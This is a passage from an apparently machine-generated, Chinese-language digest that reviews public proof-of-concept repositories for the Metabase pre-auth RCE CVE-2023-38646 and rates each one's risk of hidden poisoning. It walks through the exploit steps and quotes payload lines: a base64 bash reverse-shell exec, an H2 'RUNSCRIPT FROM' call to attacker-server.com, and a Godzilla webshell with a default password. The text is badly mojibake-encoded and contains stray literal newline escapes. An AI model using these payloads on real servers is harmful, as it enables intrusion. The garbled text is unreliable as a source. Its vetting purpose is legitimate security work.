*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

